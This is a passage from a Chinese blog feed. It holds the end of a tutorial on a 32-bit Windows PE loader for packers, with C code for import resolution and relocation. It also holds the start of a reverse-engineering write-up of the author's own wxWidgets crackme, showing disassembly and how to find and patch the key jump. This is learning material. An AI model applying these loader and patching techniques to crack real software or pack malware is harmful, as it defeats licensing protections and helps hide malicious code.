&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">module_name&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">p_image_base&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">import_descriptors&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">Name&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">HMODULE&lt;/span> &lt;span class="n">import_module&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">LoadLibraryA&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">module_name&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">import_module&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;import module is null&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">abort&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// the lookup table points to function names or ordinals =&amp;gt; it is the IDT
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">IMAGE_THUNK_DATA&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">lookup_table&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">IMAGE_THUNK_DATA&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">p_image_base&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">import_descriptors&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">OriginalFirstThunk&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// the address table is a copy of the lookup table at first
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// but we put the addresses of the loaded function inside =&amp;gt; that&amp;#39;s the IAT
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">IMAGE_THUNK_DATA&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">address_table&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">IMAGE_THUNK_DATA&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">p_image_base&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">import_descriptors&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">FirstThunk&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// null terminated array, again
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">lookup_table&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">u1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">AddressOfData&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="o">++&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">function_handle&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">// Check the lookup table for the adresse of the function name to import
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">DWORD&lt;/span> &lt;span class="n">lookup_addr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">lookup_table&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">u1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">AddressOfData&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="n">lookup_addr&lt;/span> &lt;span class="o">&amp;amp;&lt;/span> &lt;span class="n">IMAGE_ORDINAL_FLAG&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span> &lt;span class="c1">// if first bit is not 1
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// import by name : get the IMAGE_IMPORT_BY_NAME struct
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">IMAGE_IMPORT_BY_NAME&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">image_import&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">IMAGE_IMPORT_BY_NAME&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">p_image_base&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">lookup_addr&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// this struct points to the ASCII function name
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">funct_name&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">image_import&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">Name&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// get that function address from it&amp;#39;s module and name
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">function_handle&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">GetProcAddress&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">import_module&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">funct_name&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// import by ordinal, directly
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">function_handle&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">GetProcAddress&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">import_module&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">LPSTR&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">lookup_addr&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">function_handle&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;function handle is null&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">abort&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// change the IAT, and put the function address inside.
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">address_table&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">u1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">Function&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">DWORD&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">function_handle&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kt">void&lt;/span> &lt;span class="nf">fix_base_reloc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">p_image_base&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">IMAGE_NT_HEADERS&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">p_NT_headers&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">IMAGE_DATA_DIRECTORY&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">data_directory&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">p_NT_headers&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">OptionalHeader&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">DataDirectory&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">// this is how much we shifted the ImageBase
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">DWORD&lt;/span> &lt;span class="n">delta_VA_reloc&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="n">DWORD&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">p_image_base&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="n">p_NT_headers&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">OptionalHeader&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">ImageBase&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">// if there is a relocation table, and we actually shitfted the ImageBase
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">data_directory&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">IMAGE_DIRECTORY_ENTRY_BASERELOC&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">VirtualAddress&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="n">delta_VA_reloc&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// calculate the relocation table address
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">IMAGE_BASE_RELOCATION&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">p_reloc&lt;/span> &lt;span class="o">=&lt;/span>
&lt;span class="p">(&lt;/span>&lt;span class="n">IMAGE_BASE_RELOCATION&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">p_image_base&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">data_directory&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">IMAGE_DIRECTORY_ENTRY_BASERELOC&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">VirtualAddress&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// once again, a null terminated array
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">while&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">p_reloc&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">VirtualAddress&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// how any relocation in this block
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// ie the total size, minus the size of the &amp;#34;header&amp;#34;, divided by 2 (those are words, so 2 bytes for each)
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">DWORD&lt;/span> &lt;span class="n">size&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">p_reloc&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">SizeOfBlock&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">IMAGE_BASE_RELOCATION&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="o">/&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">// the first relocation element in the block, right after the header (using pointer arithmetic again)
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">WORD&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">fixups&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">WORD&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">p_reloc&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="n">size&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="o">++&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// type is the first 4 bits of the relocation word
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">type&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">fixups&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">&amp;gt;&amp;gt;&lt;/span> &lt;span class="mi">12&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">// offset is the last 12 bits
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">offset&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">fixups&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">&amp;amp;&lt;/span> &lt;span class="mh">0x0fff&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">// this is the address we are going to change
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">DWORD&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">change_addr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">DWORD&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">p_image_base&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">p_reloc&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">VirtualAddress&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">offset&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// there is only one type used that needs to make a change
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">switch&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">type&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="nl">IMAGE_REL_BASED_HIGHLOW&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="o">*&lt;/span>&lt;span class="n">change_addr&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="n">delta_VA_reloc&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">default&lt;/span>&lt;span class="o">:&lt;/span>
&lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// switch to the next relocation block, based on the size
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">p_reloc&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">IMAGE_BASE_RELOCATION&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)(((&lt;/span>&lt;span class="n">DWORD&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">p_reloc&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">p_reloc&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">SizeOfBlock&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="0x06-结论">0x06 结论&lt;/h2>
&lt;p>本文的背景知识基本是参考相关书籍，编写 Loader 的部分则来自 &lt;a class="link" href="https://bidouillesecurity.com/" target="_blank" rel="noopener"
>BidouilleSecurity&lt;/a> 。关于加壳脱壳原理，不乏形象直观的描述，也有很多脱壳相关文章，但适合萌新上手、能照着撸出代码的文章就很少，甚至可以说没地方找。抛开加壳脱壳这些特定领域话题不谈，程序的加载到执行本身对有好奇心的码农也是很值得一聊的内容。&lt;/p>
&lt;p>目前讨论的范围包括了如何加载并运行一个Windows程序（32位），大致流程如下：&lt;/p>
&lt;ul>
&lt;li>读取文件到内存&lt;/li>
&lt;li>映射文件头到基地址&lt;/li>
&lt;li>映射Sections&lt;/li>
&lt;li>填充IAT&lt;/li>
&lt;li>重定位&lt;/li>
&lt;li>跳转到入口点开始执行。&lt;/li>
&lt;/ul>
&lt;p>在对这些知识有了足够了解后，已经能写出基本的壳程序了。也许下一篇文章会谈。&lt;/p>
&lt;p>参考资料：&lt;/p>
&lt;ul>
&lt;li>
&lt;p>&lt;a class="link" href="https://bidouillesecurity.com/tutorial-writing-a-pe-packer-part-1/" target="_blank" rel="noopener"
>writing a PE packer - Part 1 : Load a PE in memory&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a class="link" href="https://bidouillesecurity.com/tutorial-writing-a-pe-packer-part-2/" target="_blank" rel="noopener"
>writing a PE packer - Part 2 : Imports and relocations&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a class="link" href="https://book.douban.com/subject/3652388/" target="_blank" rel="noopener"
>《程序员的自我修养——链接、装载与库》&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a class="link" href="https://docs.microsoft.com/en-us/windows/win32/debug/pe-format" target="_blank" rel="noopener"
>微软文档 - PE Format&lt;/a>&lt;/p>
&lt;/li>
&lt;/ul></description></item><item><title>自娱自乐 crackme-03</title><link>https://nnnewb.github.io/blog/p/crackme-03/</link><pubDate>Fri, 24 Sep 2021 16:58:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/crackme-03/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>总得有个前言。&lt;/p>
&lt;p>一直玩命令行 crackme 看着就没啥意思，来点带界面的。依然是学习用，目标是把汇编和底层和内存这套东西读熟。这次是用 wxwidgets 做的简单 crackme，为了在 CrackME-02 基础上再增加点难度但又不至于太难，这次是 OTP 生成序列号，要求解出生成 OTP 的 SECRET。&lt;/p>
&lt;h2 id="源码">源码&lt;/h2>
&lt;p>越来越长了，贴上来没法看。现在托管到GitHub，包括前面的两个cm。&lt;/p>
&lt;p>前两个cm托管的代码编译参数有一点修改，可能造成结果和文章不一致，但大体是一样的，别在意。&lt;/p>
&lt;p>源码托管地址：&lt;a class="link" href="https://github.com/nnnewb/crackmes/" target="_blank" rel="noopener"
>github.com/nnnewb/crackmes&lt;/a>&lt;/p>
&lt;p>挑战一下C++代码开启优化的Hard模式。&lt;/p>
&lt;h2 id="观察">观察&lt;/h2>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/crackme-03/01.png"
loading="lazy"
alt="image-20210923104439284"
>&lt;/p>
&lt;p>一个输入框，点击try it尝试。失败时提示Wrong，没有别的信息。&lt;/p>
&lt;h2 id="静态分析">静态分析&lt;/h2>
&lt;p>老规矩先静态分析一波，粗略扫一眼，捋一捋逻辑。用你喜欢的反汇编工具打开，我用Cutter先试试。&lt;/p>
&lt;p>因为是GUI程序，直接跳&lt;code>main&lt;/code>肯定是不行的。Win32 GUI程序的入口点（程序员视角）在&lt;code>WinMain&lt;/code>这个特殊函数，不过真拿Win32API手撸界面我是真没见过了，Win32 GUI程序设计也是玩的事件响应，找到主函数的意义不大。&lt;/p>
&lt;p>所以找关键跳这一步只能是从数据段找字符串查引用，或者调试器下合适的访问断点了。&lt;/p>
&lt;p>这里直接从数据段找到了字符串，定位到弹出错误对话框的逻辑。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/crackme-03/02.png"
loading="lazy"
alt="image-20210923105415082"
>&lt;/p>
&lt;p>这里有个姿势点是&lt;code>__thiscall&lt;/code>，这是个微软自定义的调用约定，点这里看&lt;a class="link" href="https://docs.microsoft.com/zh-cn/cpp/cpp/thiscall?view=msvc-160" target="_blank" rel="noopener"
>微软的文档&lt;/a>。&lt;/p>
&lt;h3 id="__thiscall">__thiscall&lt;/h3>
&lt;p>&lt;code>__thiscall&lt;/code>的特点是被调用方清栈，&lt;code>this&lt;/code>指针通过&lt;code>ecx&lt;/code>寄存器传递，其他参数右至左压栈。对于可变长度参数（VAARG）的成员函数会特殊处理，采用&lt;code>cdecl&lt;/code>调用约定，&lt;code>this&lt;/code>指针最后压栈。&lt;/p>
&lt;p>这里简单读一下定位到的几句代码，分析下意图。&lt;/p>
&lt;pre>&lt;code>
0x004064dc 68 34 e8 40 00 push str.Try_again ; 0x40e834
0x004064e1 8d 4d d0 lea ecx, [ebp - 0x30]
0x004064e4 ff 15 e0 33 41 00 call dword [public: void __thiscall wxString::constructor(char const *)] ; 0x4133e0
0x004064ea 68 44 e8 40 00 push str.Wrong ; 0x40e844
0x004064ef 8d 4d b0 lea ecx, [ebp - 0x50]
0x004064f2 c6 45 fc 07 mov byte [ebp - 4], 7
0x004064f6 ff 15 e0 33 41 00 call dword [public: void __thiscall wxString::constructor(char const *)] ; 0x4133e0
0x004064fc 6a ff push 0xffffffffffffffff
0x004064fe 6a ff push 0xffffffffffffffff
0x00406500 6a 00 push 0
0x00406502 6a 05 push 5 ; 5
0x00406504 8d 45 d0 lea eax, [ebp - 0x30]
0x00406507 c6 45 fc 08 mov byte [ebp - 4], 8
0x0040650b 50 push eax
0x0040650c 8d 45 b0 lea eax, [ebp - 0x50]
0x0040650f 50 push eax
0x00406510 ff 15 d4 3c 41 00 call dword [int __cdecl wxMessageBox(class wxString const &amp;amp;, class wxString const &amp;amp;, long int, class wxWindow *, int, int)] ; 0x413cd4
&lt;/code>&lt;/pre>&lt;p>反编译器对调用的第三方库的函数分析极大降低了肉眼判读的难度。可以看到前三步&lt;code>push&lt;/code>、&lt;code>lea ecx,...&lt;/code>、&lt;code>call&lt;/code> 是典型的 &lt;code>__thiscall&lt;/code> 调用，调用对象是&lt;code>wxString&lt;/code>的构造器，所以可以知道&lt;code>ecx&lt;/code>地址保存的是一个&lt;code>wxString&lt;/code>对象的指针。&lt;/p>
&lt;pre>&lt;code>0x004064ea 68 44 e8 40 00 push str.Wrong ; 0x40e844
0x004064ef 8d 4d b0 lea ecx, [ebp - 0x50]
0x004064f2 c6 45 fc 07 mov byte [ebp - 4], 7
0x004064f6 ff 15 e0 33 41 00 call dword [public: void __thiscall wxString::constructor(char const *)] ; 0x4133e0
&lt;/code>&lt;/pre>&lt;p>这是另一个&lt;code>wxString&lt;/code>的构造。&lt;/p>
&lt;pre>&lt;code>0x004064fc 6a ff push 0xffffffffffffffff
0x004064fe 6a ff push 0xffffffffffffffff
0x00406500 6a 00 push 0
0x00406502 6a 05 push 5 ; 5
0x00406504 8d 45 d0 lea eax, [ebp - 0x30]
0x00406507 c6 45 fc 08 mov byte [ebp - 4], 8
0x0040650b 50 push eax
0x0040650c 8d 45 b0 lea eax, [ebp - 0x50]
0x0040650f 50 push eax
0x00406510 ff 15 d4 3c 41 00 call dword [int __cdecl wxMessageBox(class wxString const &amp;amp;, class wxString const &amp;amp;, long int, class wxWindow *, int, int)] ; 0x413cd4
&lt;/code>&lt;/pre>&lt;p>连续推入多个参数后，调用了&lt;code>wxMessageBox&lt;/code>函数。我们知道&lt;code>[ebp-0x30]&lt;/code>是&lt;code>Try again&lt;/code>，&lt;code>[ebp-0x50]&lt;/code> 是 &lt;code>Wrong!&lt;/code>，这个调用用伪代码表示就是 &lt;code>wxMessageBox(&amp;quot;Wrong!&amp;quot;, &amp;quot;Try again!&amp;quot;, 5, 0, -1, -1)&lt;/code>。注意忽略中间的&lt;code>mov byte [ebp - 4], 8&lt;/code>，&lt;code>ebp-4&lt;/code>这个偏移显然不大可能是参数。&lt;/p>
&lt;h3 id="关键跳">关键跳&lt;/h3>
&lt;p>回到这段代码的开头，顺着界面上的绿色箭头找到关键跳。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/crackme-03/03.png"
loading="lazy"
alt="image-20210923111554787"
>&lt;/p>
&lt;p>一个&lt;code>je&lt;/code>跳转，&lt;code>je&lt;/code>指令检查&lt;code>ZF&lt;/code>，向上一行就是&lt;code>test&lt;/code>，&lt;code>test bl,bl&lt;/code>自己对自己逻辑与，其实就是求&lt;code>bl&lt;/code>是不是0。&lt;/p>
&lt;p>bl又来自前面的&lt;code>mov bl,al&lt;/code>，&lt;code>al&lt;/code>寄存器是&lt;code>eax&lt;/code>寄存器的低8位，再者大家也知道&lt;code>eax&lt;/code>寄存器是函数返回值保存的寄存器，而离这个&lt;code>mov&lt;/code>指令最近的&lt;code>call&lt;/code>就是截图上方的&lt;code>IsSameAs&lt;/code>函数了。&lt;/p>
&lt;p>到了这一步，改指令跳过验证已经接近成功了，但这要是做 keygen 的话还不行。&lt;/p>
&lt;p>继续往回翻，寻找密码生成的代码。&lt;/p>
&lt;h3 id="寻找密码生成算法">寻找密码生成算法&lt;/h3>
&lt;p>先一路回到关键跳所处的代码块顶部，挨个往下看有哪些函数调用。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/crackme-03/04.png"
loading="lazy"
alt="image-20210923113330184"
>&lt;/p>
&lt;p>还是那句话，感谢分析出了库函数，不然一堆未知函数看得满头雾水。&lt;/p>
&lt;ol>
&lt;li>
&lt;p>调用是 &lt;code>wxString.AsWChar(void)&lt;/code>，顾名思义是取宽字符，返回指针。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>调用是&lt;code>wxString.DoFormatWchar(wchar_t*)&lt;/code>，查询文档可知是个类似&lt;code>sprintf&lt;/code>的字符串格式化函数。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>调用是析构函数，怀疑上面的两个调用其实是内联了什么wxwidgets库的代码。因为直觉告诉我如果还没离开作用域，编译器应该不会这么着急插入析构函数调用，这听起来就没什么好处，还违背码农直觉。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>函数就比较迷惑了，一路看上去的话会发现这个偏移值经过了多次计算，目前看不出用意，但还挺可疑的。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>函数顾名思义，比较字符串相等。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>又是析构函数。&lt;/p>
&lt;/li>
&lt;/ol>
&lt;p>重点看字符串比较函数的参数：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-asm" data-lang="asm">&lt;span class="err">0&lt;/span>&lt;span class="nf">x0040646c&lt;/span> &lt;span class="mi">6&lt;/span>&lt;span class="no">a&lt;/span> &lt;span class="mi">01&lt;/span> &lt;span class="no">push&lt;/span> &lt;span class="mi">1&lt;/span> &lt;span class="c">; 1
&lt;/span>&lt;span class="c">&lt;/span>&lt;span class="mi">0x0040646e&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="no">d&lt;/span> &lt;span class="mi">4&lt;/span>&lt;span class="no">d&lt;/span> &lt;span class="mi">90&lt;/span> &lt;span class="no">lea&lt;/span> &lt;span class="no">ecx&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">ebp&lt;/span> &lt;span class="p">-&lt;/span> &lt;span class="mi">0x70&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="err">0&lt;/span>&lt;span class="nf">x00406471&lt;/span> &lt;span class="no">c6&lt;/span> &lt;span class="mi">45&lt;/span> &lt;span class="no">fc&lt;/span> &lt;span class="mi">04&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">byte&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">ebp&lt;/span> &lt;span class="p">-&lt;/span> &lt;span class="mi">4&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="mi">4&lt;/span>
